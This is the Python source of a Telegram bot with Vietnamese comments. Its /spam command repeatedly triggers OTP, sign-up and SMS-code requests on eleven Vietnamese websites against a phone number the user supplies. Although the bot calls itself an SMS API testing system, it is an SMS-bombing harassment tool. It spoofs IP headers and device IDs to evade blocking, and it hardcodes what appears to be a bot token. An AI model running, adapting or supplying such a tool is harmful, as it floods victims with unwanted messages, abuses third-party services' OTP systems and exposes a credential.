import os
import random
import string
import time
import json
import hashlib
import uuid
import asyncio
import urllib3
import requests
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

# Thư viện Telegram Bot (v20.x+)
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler

# Thư viện tạo Web Server nhỏ để Render không bị ngủ (Port 10000 mặc định của Render)
from aiohttp import web

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ================= CẤU HÌNH BOT =================
TOKEN = os.getenv("TELEGRAM_TOKEN", "8749959758:AAFmtPMn_hMDuiSTh-WthbwLySegJSareQI") 
PORT = int(os.getenv("PORT", 8080))

# Khóa dùng để quản lý trạng thái chạy của từng user
user_tasks = {}
# Lưu dữ liệu cấu trúc mẫu
ho = ["Nguyễn", "Trần", "Lê", "Phạm", "Hoàng", "Huỳnh", "Vũ", "Đặng"]
ten = ["Tuấn", "Minh", "Hùng", "Anh", "Hoàng", "Đức", "Nam", "Phúc"]
USER_AGENTS = [
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
]

# ================= HÀM BỔ TRỢ =================
def generate_random_email(domain="example.com"):
    length = random.randint(5, 10)
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=length)) + f"@{domain}"

def phonet(phone):
    if phone.startswith("0"):
        return "+84" + phone[1:]
    return phone

def random_headers():
    devices = ["SM-G998B", "SM-F926B", "SM-S901B", "SM-A536E", "Xiaomi 13 Pro", "iPhone16,2", "Pixel 8 Pro"]
    android_versions = ["11", "12", "13", "14", "15"]
    return {
        "User-Agent": f"Dalvik/2.1.0 (Linux; U; Android {random.choice(android_versions)}; {random.choice(devices)})",
        "X-Device-ID": hashlib.md5(str(random.random()).encode()).hexdigest()[:16],
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
        "Accept-Language": random.choice(["vi-VN", "en-US"]),
        "Accept-Encoding": "gzip",
    }

# ================= ĐỊNH NGHĨA CÁC API TARGETS =================
def run_api_target(target_name, phone):
    """Hàm lõi chạy đồng bộ từng API đơn lẻ, trả về True/False"""
    NAME = f"{random.choice(ho)} {random.choice(ten)}"
    email = generate_random_email()
    
    try:
        if target_name == "center":
            url = "https://a.ladipage.com/event"
            headers = {
                "Content-Type": "application/json",
                "LADI_CLIENT_ID": "7f71ce3d-47a6-4206-6175-9b609d43c221",
                "User-Agent": random.choice(USER_AGENTS),
            }
            data = {"event": "PageView", "store_id": "5977f59d1abc544991d43c5b", "domain": "khuyenmai.seoulcenter.com.vn", "ladipage_id": "6985595d7beb82001297bf6c", "data": [], "tracking_page": True}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code < 400

        elif target_name == "isofhcare":
            headers = {"Accept": "application/json", "Content-Type": "application/json", "deviceType": "web", "User-Agent": random.choice(USER_AGENTS)}
            json_data = {"user": {"password": "6172ac2267e793a6c86dfd7a0a348289", "telephoneNumber": {"number": phone, "dialingCode": "+84"}, "role": 1}, "socialType": 1}
            r = requests.post("https://api-produce.isofhcare.com/isofhcare/user/register", headers=headers, json=json_data, timeout=8)
            return r.status_code < 400

        elif target_name == "vuiapp":
            url = "https://api-vncdn.vuiapp.vn/graphql"
            headers = {"Content-Type": "application/json"}
            headers.update(random_headers())
            json_data = {"query": "mutation requestLogin($payload: RequestLoginPayload!) {\n  requestLogin(payload: $payload) {\n    isNew\n    token\n    __typename\n  }\n}\n", "variables": {"payload": {"confirmSharingInformation": True, "otpLength": 6, "phoneNumber": phone}}, "operationName": "requestLogin"}
            r = requests.post(url, headers=headers, json=json_data, timeout=8)
            return r.status_code < 400

        elif target_name == "heyu":
            headers = {"accept": "application/json, text/plain, */*", "content-type": "application/json", "user-agent": random.choice(USER_AGENTS)}
            json_data = {"phone": phone, "regionName": None, "nativeVersion": 2027, "reqT": int(time.time()*1000)}
            r = requests.post("https://book.heyu.vn/api/sms/send-code", headers=headers, json=json_data, timeout=8)
            return r.status_code < 400

        elif target_name == "babilala":
            headers = {"phone": phone, "content-type": "application/x-www-form-urlencoded", "user-agent": "babilala/1 CFNetwork/1335.0.3.4"}
            r = requests.post("https://api.babilala.vn/api/getOtp", headers=headers, timeout=8)
            return r.status_code < 400

        elif target_name == "prep_vn":
            headers = {"accept": "application/json", "content-type": "application/json", "user-agent": random.choice(USER_AGENTS)}
            r = requests.post("https://accounts.prep.vn/api/v1/auth/phone-otp/login", headers=headers, json={"phone": phonet(phone)}, timeout=8)
            return r.status_code < 400

        elif target_name == "thucuc":
            r = requests.get(f"https://benhvienthucuc.vn/landing/thank-you/?phone={phone}", timeout=8)
            return r.status_code < 400

        elif target_name == "hocmai":
            headers = {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": random.choice(USER_AGENTS)}
            data = {"fullname": NAME, "phone": phone, "email": email, "nhucauhoc": "CAMBRIDGE"}
            r = requests.post("https://hocmai.vn/new-student/", headers=headers, data=data, timeout=8)
            return r.status_code < 400

        elif target_name == "doccen":
            headers = {"Content-Type": "application/json", "tenant": "root", "User-Agent": random.choice(USER_AGENTS)}
            r = requests.post("https://api.doccen.vn/api/auth/sign-up", headers=headers, json={"phoneNumber": phone, "password": "Password-123"}, timeout=8)
            return r.status_code in (200, 201, 409)

        elif target_name == "vttl":
            url2 = "https://vttl.org/vtl/api/user/sentSms"
            headers = {"Content-Type": "application/json; charset=utf-8", "language": "vi_VN"}
            headers.update(random_headers())
            body2 = {"277f4_phone": phone, "e7755_smsType": 1, "b3f6c_type": "1", "5d250_loanProductName": "vtl_trung_m"}
            r = requests.post(url2, headers=headers, json=body2, timeout=8)
            return r.status_code < 400

        elif target_name == "gpp_pharmacy":
            headers = {"content-type": "application/json; charset=UTF-8", "User-Agent": random.choice(USER_AGENTS)}
            r = requests.post("https://gpp.com.vn/account/LayMaXacThucDangKyTaiKhoan", headers=headers, json={"soDienThoai": phone}, timeout=8)
            return r.status_code < 400
            
    except Exception:
        return False
    return False

# ================= ĐIỀU KHIỂN LUỒNG CHẠY BOT =================
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    welcome_text = (
        "⚡ <b>HỆ THỐNG BOT KIỂM THỬ API SMS</b> ⚡\n"
        "---------------------------------------\n"
        "Chào mừng bạn đến với hệ thống chạy lệnh tự động.\n\n"
        "👉 <b>Cú pháp lệnh:</b>\n"
        "<code>/spam [Số_Điện_Thoại] [Số_Lần_Lặp]</code>\n\n"
        "Ví dụ mẫu: <code>/spam 0987654321 20</code>\n\n"
        "❌ Để dừng tiến trình đang chạy, bấm: /stop"
    )
    await update.message.reply_text(welcome_text, parse_mode="HTML")

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id in user_tasks and user_tasks[chat_id]:
        user_tasks[chat_id] = False  # Đánh dấu cờ dừng
        await update.message.reply_text("🛑 <i>Đang gửi tín hiệu dừng tiến trình... Vui lòng đợi vòng lặp hiện tại kết thúc!</i>", parse_mode="HTML")
    else:
        await update.message.reply_text("ℹ️ Hiện tại bạn không có tiến trình nào đang chạy.")

async def spam_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    
    # Kiểm tra xem user có đang chạy dở nhiệm vụ nào không
    if chat_id in user_tasks and user_tasks[chat_id] is True:
        await update.message.reply_text("⚠️ <b>Bạn đang có một tiến trình đang chạy!</b> Vui lòng sử dụng lệnh /stop trước khi tạo mới.", parse_mode="HTML")
        return

    # Check tham số đầu vào
    if len(context.args) != 2:
        await update.message.reply_text("❌ <b>Sai định dạng cú pháp!</b>\nSử dụng: <code>/spam [SĐT] [Số_Lần]</code>", parse_mode="HTML")
        return

    phone = context.args[0]
    try:
        loops = int(context.args[1])
    except ValueError:
        await update.message.reply_text("❌ <b>Số lần lặp</b> phải là một số nguyên dương!", parse_mode="HTML")
        return

    if loops <= 0 or loops > 200:
        await update.message.reply_text("❌ Số lần lặp giới hạn từ <b>1 đến 200 lần</b> để bảo vệ tài nguyên bot!", parse_mode="HTML")
        return

    # Khởi tạo danh sách các API target
    targets = ["center", "isofhcare", "vuiapp", "heyu", "babilala", "prep_vn", "thucuc", "hocmai", "doccen", "vttl", "gpp_pharmacy"]
    
    # Bộ đếm thống kê xem được từng api bao nhiêu lần
    api_stats = {tgt: {"success": 0, "fail": 0} for tgt in targets}
    total_requests = 0
    
    # Gửi tin nhắn trạng thái ban đầu
    status_message = await update.message.reply_text("🚀 <i>Đang khởi tạo tiến trình kiểm thử hệ thống...</i>", parse_mode="HTML")
    
    # Bật cờ cho phép chạy
    user_tasks[chat_id] = True
    
    # Sử dụng ThreadPoolExecutor kết hợp chạy để tối ưu đa luồng
    loop_env = asyncio.get_event_loop()
    
    with ThreadPoolExecutor(max_workers=5) as executor:
        for current_round in range(1, loops + 1):
            if not user_tasks.get(chat_id, False):
                break # Người dùng ra lệnh stop
                
            # Tạo các tác vụ chạy đồng thời cho danh sách API trong lượt này
            futures = {executor.submit(run_api_target, tgt, phone): tgt for tgt in targets}
            
            for future in futures:
                tgt_name = futures[future]
                # Chuyển xử lý kết quả về async để không block bot
                result = await loop_env.run_in_executor(None, future.result)
                
                total_requests += 1
                if result:
                    api_stats[tgt_name]["success"] += 1
                else:
                    api_stats[tgt_name]["fail"] += 1
            
            # --- Tạo giao diện tiến trình màu mè sinh động ---
            progress_bar_length = 10
            filled_length = int(progress_bar_length * current_round // loops)
            bar = "🟩" * filled_length + "⬜" * (progress_bar_length - filled_length)
            percent = int((current_round / loops) * 100)
            
            # Xây dựng bảng thống kê chi tiết API
            stats_table = ""
            for name, data in api_stats.items():
                stats_table += f"• <code>{name:<12}</code>:  ✅ {data['success']:02d}  |  ❌ {data['fail']:02d}\n"

            msg_template = (
                f"⚡ <b>TIẾN TRÌNH ĐANG CHẠY</b> ⚡\n"
                f"-----------------------------------------\n"
                f"📱 Target Phone: <code>{phone}</code>\n"
                f"🔄 Tiến độ vòng: <b>{current_round}/{loops}</b>\n"
                f"📊 Phần trăm: <b>{percent}%</b>\n"
                f"📶 Trạng thái: {bar}\n\n"
                f"📊 <b>BẢNG ĐẾM CHI TIẾT TỪNG API:</b>\n"
                f"-----------------------------------------\n"
                f"{stats_table}"
                f"-----------------------------------------\n"
                f"✨ Tổng số Request đã thực thi: <b>{total_requests}</b>\n"
                f"🛑 <i>Bấm /stop bất cứ lúc nào để dừng</i>"
            )
            
            # Cứ mỗi lượt cập nhật tin nhắn một lần (tránh telegram bóp rate limit)
            try:
                await status_message.edit_text(msg_template, parse_mode="HTML")
            except Exception:
                pass
            
            await asyncio.sleep(1) # Nghỉ ngắn giữa các đợt bắn chống block IP

    # --- Kết thúc tiến trình ---
    is_stopped = not user_tasks.get(chat_id, False)
    user_tasks[chat_id] = False
    
    final_stats = ""
    for name, data in api_stats.items():
        final_stats += f"• <code>{name:<12}</code>:  ✅ {data['success']:02d}  |  ❌ {data['fail']:02d}\n"
        
    end_status = "🛑 TIẾN TRÌNH ĐÃ BỊ DỪNG" if is_stopped else "✅ HOÀN THÀNH TIẾN TRÌNH"
    
    final_text = (
        f"🏁 <b>{end_status}</b> 🏁\n"
        f"-----------------------------------------\n"
        f"📱 Số điện thoại: <code>{phone}</code>\n"
        f"📊 Đã chạy tổng cộng: <b>{total_requests} requests</b>\n\n"
        f"📊 <b>BẢNG THỐNG KÊ KẾT QUẢ CUỐI CÙNG:</b>\n"
        f"{final_stats}"
        f"-----------------------------------------\n"
        f"⏰ Giờ kết thúc: {datetime.now().strftime('%H:%M:%S - %d/%m/%Y')}\n"
        f"🚀 Cám ơn bạn đã sử dụng dịch vụ!"
    )
    await status_message.reply_text(final_text, parse_mode="HTML")

# ================= SERVER GIỮ PING CHO RENDER =================
async def handle_ping(request):
    return web.Response(text="Bot đang chạy online 24/7!")

async def start_web_server():
    app = web.Application()
    app.router.add_get('/', handle_ping)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', PORT)
    await site.start()
    print(f"Web Server phục vụ Render đã kích hoạt tại Port: {PORT}")

# ================= HÀM KHỞI CHẠY CHÍNH =================
def main():
    # Khởi tạo Telegram Bot ứng dụng bất đồng bộ
    bot_app = Application.builder().token(TOKEN).build()

    # Đăng ký các câu lệnh điều khiển bot
    bot_app.add_handler(CommandHandler("start", start_command))
    bot_app.add_handler(CommandHandler("spam", spam_command))
    bot_app.add_handler(CommandHandler("stop", stop_command))

    # Tích hợp chạy Web server song song cùng bot
    loop = asyncio.get_event_loop()
    loop.run_until_complete(start_web_server())

    print("Bot Telegram đang lắng nghe tín hiệu...")
    bot_app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
